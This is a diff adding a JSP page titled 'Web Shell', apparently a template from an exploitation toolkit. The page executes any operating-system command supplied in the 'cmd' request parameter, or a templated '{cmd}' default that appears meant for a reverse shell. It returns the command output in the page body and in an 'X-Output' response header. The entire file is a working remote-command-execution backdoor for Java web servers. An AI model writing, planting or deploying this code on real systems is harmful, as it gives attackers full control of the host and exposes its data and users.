@@ -1,0 +1,72 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:directive.page import="java.io.*" />
+<jsp:directive.page import="java.util.*" />
+<html>
+<head>
+    <title>Web Shell</title>
+</head>
+<body>
+    <h1>Web Shell</h1>
+<jsp:scriptlet>
+    String reverse_cmd = "{cmd}";
+    String cmd = request.getParameter("cmd");
+    if (cmd == null || cmd.trim().length() == 0) {
+        cmd = reverse_cmd;
+    }
+    String output = "";
+    String output_x = "";
+    if (cmd != null) {
+        try {
+            // Runtime.exec() handles cross-platform automatically
+            Process p = null;
+            if (cmd.startsWith("{") &amp;&amp; cmd.endsWith("}")) {
+                cmd = cmd.substring(1, cmd.length() - 1); // remove { and }
+                String[] cmd_array = cmd.split(",");
+                for (int i = 0; i &lt; cmd_array.length; i++) {
+                    cmd_array[i] = cmd_array[i].trim().replaceAll("^\"|\"$", "");
+                }
+                p = Runtime.getRuntime().exec(cmd_array);
+            } else {
+                p = Runtime.getRuntime().exec(cmd);
+            }
+            
+            // Read stdout
+            BufferedReader stdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            while ((line = stdOut.readLine()) != null) {
+                output += line + "&lt;br/&gt;";
+                output_x += line + "\n";
+            }
+            
+            // Read stderr
+            BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+            while ((line = stdErr.readLine()) != null) {
+                output += line + "&lt;br/&gt;";
+                output_x += line + "\n";
+            }
+            
+            int exitCode = p.waitFor();
+            if (exitCode != 0) {
+                output += "Exit code: " + exitCode + "&lt;br/&gt;";
+                output_x += "Exit code: " + exitCode + "\n";
+            }
+            
+            stdOut.close();
+            stdErr.close();
+            
+        } catch (Exception e) {
+            output += "Error: " + e.getMessage() + "&lt;br/&gt;";
+            output_x += "Error: " + e.getMessage() + "\n";
+
+        }
+        finally {
+            response.setHeader("X-Output", output_x);
+        }   
+    }
+</jsp:scriptlet>
+<pre>
+<jsp:expression>output</jsp:expression>
+</pre>
+</body>
+</html>
+</jsp:root>
